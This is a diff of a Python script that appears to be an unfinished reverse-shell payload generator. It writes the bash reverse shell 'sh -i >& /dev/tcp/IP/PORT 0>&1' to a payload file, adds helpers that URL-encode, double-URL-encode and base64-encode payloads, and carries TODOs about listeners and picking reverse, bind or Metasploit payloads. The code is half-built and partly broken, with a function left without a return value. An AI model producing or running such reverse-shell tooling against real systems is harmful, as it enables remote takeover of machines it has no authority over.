@@ -1,6 +1,6 @@
 import fileinput
 import os
-from sys import argv
+import io
 import urllib.parse
 import base64
 
@@ -24,6 +24,7 @@ print('''
                                                                                     
 ''')
 #######################NOTES-STR#######################
+PAYLOAD = input("What payload do you want to use: ")
 # IP_var = input("Receiving IP: ")
 # PORT_var = input("Receiving PORT: ")
 # IP = print(open('file.txt', 'r').read().replace('IP', IP_var) ) # ----> Really Really important.
@@ -42,11 +43,19 @@ def main():
   # read the content of the file opened
   content = file.readlines()
   # read nth line from the file
-  return(content[0])
 
-#yet_to_decide()
 
-# display_payload_options()
+def display_actual():
+  kilo = open('assets/payloads.txt')
+  content1 = kilo.readlines()
+  f = open("assets/current-payload.txt", "x+")
+  f = open('assets/current-payload.txt', 'w')
+  f.write("sh -i >& /dev/tcp/IP/PORT 0>&1")
+  # WORKS UNTIL THE ABOVE LINE ^^
+display_actual()
+
+# output = io.StringIO()
+# output.write(main())
 
 # This function is for urlencoding the payloads.
 def url_encode():
@@ -59,6 +68,7 @@ def double_url_encode():
   charlie = urllib.parse.quote(bravo, safe='')
   print(charlie)
 
+# This function is for base64 encoding the payloads.
 def base64_encode():
   delta = 'PAYLOAD'
   echo = delta.encode('utf-8')
@@ -70,3 +80,5 @@ def base64_encode():
 # TODO: Work on listener options.
 # TODO: Work on how I can do most of this from single command in the terminal instead of throwing the user a whole bunch of fucking prompts once they run the tool.
 # TODO: ^^ Includes how to select Reverse, Bind or MSF and how to select a particular payload they want(inside the sections in the revhsells website).
+# TODO: For def main() https://www.w3resource.com/python-exercises/os/python-os-exercise-16.php memory buffer values.
+# TODO: Work on memory buffer thingy, see if it works and implement if it works.
